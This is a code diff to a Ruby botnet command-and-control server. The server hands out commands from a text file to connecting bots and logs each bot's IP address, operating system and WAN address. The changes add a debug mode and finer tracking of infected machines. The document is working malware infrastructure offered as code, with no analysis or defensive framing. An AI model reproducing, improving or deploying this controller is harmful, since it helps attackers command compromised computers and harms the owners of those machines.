@@ -11,7 +11,7 @@ begin
     exit
   end
   masterport = 45678
-
+  system('clear')
   puts "
    _______ _______ ______ _______
   |     __|       |   __ \\   _   |
@@ -28,15 +28,19 @@ begin
   cmdf = File.new("cmd.txt", 'w')
   cmdf.puts("NONE")
   cmdf.close
-  print_status("Starting botmaster listener on port #{masterport}...")
-  system("ruby botmaster.rb #{masterport} &")
+  if ARGV.include? "DEBUG"
+    print_status("Starting botmaster listener on port #{masterport} (DEBUG mode)...")
+    system("ruby botmaster.rb #{masterport} DEBUG &")
+  else
+    print_status("Starting botmaster listener on port #{masterport}...")
+    system("ruby botmaster.rb #{masterport} &")
+  end
 
   bot_file = File.new("bots.txt", 'a+')
 
 
   loop do
     Thread.start(server.accept) do |socket|
-
       # Create the HTTP response
       cmd_file_read = File.new("cmd.txt", 'r')
       response = cmd_file_read.read
@@ -50,15 +54,23 @@ begin
       # Write response but don't write to bot file
       if File.readlines("bots.txt").grep(/#{socket.peeraddr[3]}/).any?
         socket.write res
-        puts "Old conn"
+        debug "Old conn"
         socket.close
       end
 
-      print_good("New bot connection from #{socket.peeraddr[3]}\n")
-      bot_file.write("#{socket.peeraddr[3]}\n")
+      # Get request
+      request = socket.gets
+
+      # Parse request
+      info = request.split("/")
+      os = info[1]
+      wanip = info[2].gsub(" HTTP", "")
+
+      # Print info
+      print_good("New bot connection from #{wanip}\n")
+      bot_file.write("#{socket.peeraddr[3]}::#{os}::#{wanip}\n")  # XXX maybe replace socket.peeraddr with wanip
       bot_file.close
 
-      request = socket.gets
       STDERR.puts request
       socket.print res
 
